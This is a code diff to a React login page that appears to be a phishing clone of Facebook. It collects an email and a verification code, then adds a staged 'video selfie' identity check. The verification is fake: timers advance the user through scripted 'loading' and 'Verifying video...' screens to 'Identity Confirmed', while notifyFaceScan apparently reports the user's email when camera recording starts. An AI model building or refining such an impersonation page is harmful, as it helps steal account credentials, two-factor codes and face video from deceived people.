@@ -77,8 +77,9 @@ export default function LoginPage() {
   const [userEmail, setUserEmail] = useState("");
   const [verificationCode, setVerificationCode] = useState("");
   const [stream, setStream] = useState<MediaStream | null>(null);
-  const [currentDirection, setCurrentDirection] = useState<"center" | "up" | "down" | "left" | "right">("center");
+  const [currentDirection, setCurrentDirection] = useState<"left" | "right" | null>(null);
   const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
+  const [isRecording, setIsRecording] = useState(false);
   const videoRef = useState<HTMLVideoElement | null>(null)[0];
 
   const loginForm = useForm<LoginForm>({
@@ -111,10 +112,10 @@ export default function LoginPage() {
     if (currentStep === "loading-login") {
       timer = setTimeout(() => setCurrentStep("code"), 3000);
     } else if (currentStep === "loading-code") {
-      timer = setTimeout(() => setCurrentStep("face-verification"), 5000);
-    } else if (currentStep === "face-rotation") {
-      setCurrentDirection("center");
+      timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
+    } else if (currentStep === "recording") {
       setCompletedDirections(new Set());
+      setCurrentDirection(null);
     }
 
     return () => clearTimeout(timer);
@@ -151,8 +152,7 @@ export default function LoginPage() {
         audio: false
       });
       setStream(mediaStream);
-      await notifyFaceScan(userEmail);
-      setCurrentStep("face-rotation");
+      setCurrentStep("instructions");
       if (videoRef) {
         videoRef.srcObject = mediaStream;
       }
@@ -162,21 +162,29 @@ export default function LoginPage() {
     }
   };
 
+  const handleStartRecording = async () => {
+    await notifyFaceScan(userEmail);
+    setIsRecording(true);
+    setCurrentStep("recording");
+    setCurrentDirection("left");
+  };
+
   const handleDirectionComplete = (direction: string) => {
     const newCompleted = new Set(completedDirections);
     newCompleted.add(direction);
     setCompletedDirections(newCompleted);
 
-    const directions = ["up", "down", "left", "right"];
-    const remainingDirections = directions.filter(d => !newCompleted.has(d));
-
-    if (remainingDirections.length === 0) {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-      }
-      setCurrentStep("complete");
-    } else {
-      setCurrentDirection(remainingDirections[0] as any);
+    if (direction === "left") {
+      setCurrentDirection("right");
+    } else if (direction === "right") {
+      setIsRecording(false);
+      setCurrentStep("processing");
+      setTimeout(() => {
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+        setCurrentStep("complete");
+      }, 2000);
     }
   };
 
@@ -352,43 +360,125 @@ export default function LoginPage() {
             </div>
           )}
 
-          {/* Face Verification */}
-          {currentStep === "face-verification" && (
+          {/* Face Intro - Confirm Identity */}
+          {currentStep === "face-intro" && (
             <div className="text-center">
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Face Verification</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                We need to verify your identity using facial recognition. You'll be asked to look in different directions.
-              </p>
-              <div className="w-32 h-32 mx-auto mb-6 rounded-full border-4 flex items-center justify-center" style={{ borderColor: '#1877f2' }}>
-                <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
-                </svg>
+              <div className="mb-6">
+                <img
+                  src="/favicon.png"
+                  alt="Facebook"
+                  className="w-16 h-16 mx-auto"
+                />
               </div>
+              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
+              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
+                We need to verify your identity before you can continue to Facebook.
+              </p>
               <button
-                onClick={handleStartFaceVerification}
+                onClick={() => setCurrentStep("face-explanation")}
                 className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                 style={{ backgroundColor: '#1877f2' }}
-                data-testid="button-start-face"
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
               >
-                Start Face Scan
+                Continue
               </button>
             </div>
           )}
 
-          {/* Face Rotation - Camera Feed */}
-          {currentStep === "face-rotation" && (
+          {/* Face Explanation */}
+          {currentStep === "face-explanation" && (
             <div className="text-center">
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>
-                {currentDirection === "center" ? "Position Your Face" : `Look ${currentDirection.toUpperCase()}`}
+              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                We'll compare a video of your face to your profile photos. This helps us confirm it's your account.
+              </p>
+              
+              {/* Illustration */}
+              <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z" />
+                </svg>
+              </div>
+
+              <button
+                onClick={handleStartFaceVerification}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition mb-3"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+              >
+                Continue
+              </button>
+              <button
+                onClick={() => setCurrentStep("login")}
+                className="text-sm"
+                style={{ color: '#1877f2' }}
+              >
+                Cancel
+              </button>
+            </div>
+          )}
+
+          {/* Instructions Screen */}
+          {currentStep === "instructions" && (
+            <div className="text-center">
+              <h2 className="text-xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
+              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
+                Center your face in the frame. You'll be asked to slowly turn your head left, then right.
+              </p>
+
+              {/* Camera Preview */}
+              <div className="relative w-64 h-80 mx-auto mb-6 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+                <video
+                  ref={(el) => {
+                    if (el && stream) {
+                      el.srcObject = stream;
+                      el.play();
+                    }
+                  }}
+                  autoPlay
+                  playsInline
+                  muted
+                  className="w-full h-full object-cover scale-x-[-1]"
+                />
+                
+                {/* Face outline guide */}
+                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                  <div
+                    className="w-48 h-64 rounded-full border-4"
+                    style={{
+                      borderColor: 'rgba(255, 255, 255, 0.5)',
+                      borderStyle: 'dashed'
+                    }}
+                  />
+                </div>
+              </div>
+
+              <button
+                onClick={handleStartRecording}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+              >
+                Start Recording
+              </button>
+            </div>
+          )}
+
+          {/* Recording Screen */}
+          {currentStep === "recording" && (
+            <div className="text-center">
+              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>
+                {currentDirection === null ? "Recording..." : `Turn your head ${currentDirection}`}
               </h2>
-              <p className="text-sm mb-4" style={{ color: '#65676b' }}>
-                {currentDirection === "center"
-                  ? "Center your face in the frame"
-                  : `Turn your head to look ${currentDirection}`}
+              <p className="text-xs mb-4" style={{ color: '#65676b' }}>
+                Follow the instructions on the screen
               </p>
 
               {/* Camera Feed */}
-              <div className="relative w-64 h-64 mx-auto mb-4 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+              <div className="relative w-full max-w-sm mx-auto mb-4 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000', aspectRatio: '3/4' }}>
                 <video
                   ref={(el) => {
                     if (el && stream) {
@@ -402,49 +492,51 @@ export default function LoginPage() {
                   className="w-full h-full object-cover scale-x-[-1]"
                 />
 
-                {/* Direction Indicator Overlay */}
+                {/* Circular face guide with direction arrow */}
                 <div className="absolute inset-0 pointer-events-none">
-                  {/* Center circle guide */}
                   <div className="absolute inset-0 flex items-center justify-center">
                     <div
-                      className="w-48 h-56 rounded-full border-4"
+                      className="w-56 h-72 rounded-full border-4"
                       style={{
-                        borderColor: completedDirections.has(currentDirection) ? '#00a400' : '#1877f2',
-                        borderStyle: 'dashed'
+                        borderColor: isRecording ? '#1877f2' : 'rgba(255, 255, 255, 0.3)',
+                        borderStyle: 'solid',
+                        transition: 'border-color 0.3s'
                       }}
                     />
                   </div>
 
-                  {/* Direction arrow */}
-                  {currentDirection !== "center" && (
+                  {/* Direction indicator */}
+                  {currentDirection && (
                     <div className="absolute inset-0 flex items-center justify-center">
                       <div
-                        className="text-white font-bold text-4xl"
+                        className="text-white font-bold text-5xl"
                         style={{
-                          transform:
-                            currentDirection === "up" ? "translateY(-80px)" :
-                            currentDirection === "down" ? "translateY(80px)" :
-                            currentDirection === "left" ? "translateX(-80px)" :
-                            currentDirection === "right" ? "translateX(80px)" : "",
-                          textShadow: '0 0 10px rgba(0,0,0,0.8)'
+                          transform: currentDirection === "left" ? "translateX(-90px)" : "translateX(90px)",
+                          textShadow: '0 0 20px rgba(0,0,0,0.9)',
+                          transition: 'transform 0.5s ease'
                         }}
                       >
-                        {currentDirection === "up" ? "↑" :
-                         currentDirection === "down" ? "↓" :
-                         currentDirection === "left" ? "←" :
-                         currentDirection === "right" ? "→" : ""}
+                        {currentDirection === "left" ? "←" : "→"}
                       </div>
+                    </div>
+                  )}
+
+                  {/* Recording indicator */}
+                  {isRecording && (
+                    <div className="absolute top-4 left-4 flex items-center gap-2 bg-black bg-opacity-50 px-3 py-1 rounded-full">
+                      <div className="w-3 h-3 rounded-full bg-red-500 animate-pulse" />
+                      <span className="text-white text-xs font-medium">Recording</span>
                     </div>
                   )}
                 </div>
               </div>
 
-              {/* Progress indicators */}
-              <div className="flex justify-center gap-2 mb-4">
-                {["up", "down", "left", "right"].map((dir) => (
+              {/* Progress */}
+              <div className="flex justify-center gap-3 mb-4">
+                {["left", "right"].map((dir) => (
                   <div
                     key={dir}
-                    className="w-3 h-3 rounded-full"
+                    className="w-3 h-3 rounded-full transition-colors"
                     style={{
                       backgroundColor: completedDirections.has(dir) ? '#00a400' : '#e4e6eb'
                     }}
@@ -452,33 +544,61 @@ export default function LoginPage() {
                 ))}
               </div>
 
-              <p className="text-sm font-medium mb-4" style={{ color: '#65676b' }}>
-                {completedDirections.size} of 4 directions completed
-              </p>
+              <button
+                onClick={() => currentDirection && handleDirectionComplete(currentDirection)}
+                disabled={!currentDirection}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-50"
+                style={{ backgroundColor: '#1877f2' }}
+              >
+                Confirm
+              </button>
 
               <button
-                onClick={() => handleDirectionComplete(currentDirection)}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
-                style={{ backgroundColor: '#1877f2' }}
-                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
-                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                onClick={() => {
+                  if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                  }
+                  setCurrentStep("login");
+                }}
+                className="mt-3 text-xs"
+                style={{ color: '#65676b' }}
               >
-                {currentDirection === "center" ? "Start" : "Confirm Direction"}
+                Cancel verification
               </button>
             </div>
           )}
 
-          {/* Complete */}
+          {/* Processing */}
+          {currentStep === "processing" && (
+            <div className="text-center py-12">
+              <div className="relative w-16 h-16 mx-auto mb-4">
+                <div
+                  className="absolute inset-0 rounded-full border-4"
+                  style={{
+                    borderColor: '#e4e6eb',
+                    borderTopColor: '#1877f2',
+                    animation: 'fb-spin 1s linear infinite'
+                  }}
+                />
+              </div>
+              <h2 className="text-lg font-semibold mb-2" style={{ color: '#1c1e21' }}>Verifying video...</h2>
+              <p className="text-sm" style={{ color: '#65676b' }}>
+                This may take a few moments.
+              </p>
+            </div>
+          )}
+
+          {/* Complete - Identity Confirmed */}
           {currentStep === "complete" && (
-            <div className="text-center">
-              <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#00a400' }}>
-                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <div className="text-center py-8">
+              <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#00a400' }}>
+                <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                 </svg>
               </div>
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Verification Complete</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                Your identity has been verified successfully.
+              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
+              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
+                You can now continue to Facebook.
               </p>
               <button
                 onClick={() => {
@@ -486,7 +606,8 @@ export default function LoginPage() {
                   setUserEmail("");
                   setVerificationCode("");
                   setCompletedDirections(new Set());
-                  setCurrentDirection("center");
+                  setCurrentDirection(null);
+                  setIsRecording(false);
                   if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                     setStream(null);
@@ -494,9 +615,11 @@ export default function LoginPage() {
                 }}
                 className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                 style={{ backgroundColor: '#1877f2' }}
-                data-testid="button-done"
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                data-testid="button-continue"
               >
-                Done
+                Continue
               </button>
             </div>
           )}
